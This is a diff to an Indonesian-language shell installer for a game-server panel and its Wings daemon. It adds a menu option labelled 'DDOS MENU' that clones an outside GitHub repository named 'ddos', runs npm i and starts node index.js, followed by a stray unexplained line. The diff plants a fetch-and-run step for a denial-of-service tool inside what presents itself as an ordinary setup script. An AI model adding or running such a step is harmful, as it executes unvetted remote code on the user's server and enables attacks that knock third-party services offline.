@@ -198,9 +198,10 @@ echo "14. INSTALL WINGS"
 echo "15. UNINSTALL PANEL"
 echo "16. BUAT NODE PANEL"
 echo "17. CONFIGURE WINGS"
-echo "18. KELUAR DARI INSTALLER"
+echo "18. DDOS MENU"
+echo "19. KELUAR DARI INSTALLER"
  echo -e "${BLUE}[+] ============================================== [+]${NC}"
-read -p "PILIH OPSI (1-18): " OPTION
+read -p "PILIH OPSI (1-19): " OPTION
 case "$OPTION" in
     1)
         # Masukkan token GitHub langsung di sini
@@ -1060,6 +1061,14 @@ sudo systemctl start wings
         exit 0
         ;;
     18)
+       git clone https://github.com/RiiSTOREz/ddos
+       cd ddos
+       npm i
+       node index.js
+       limau
+        exit
+        ;;
+    19)
         echo -e "${BLUE}EXIT DARI INSTALLER DIPILIH${RESET}"
         exit 0
         ;;
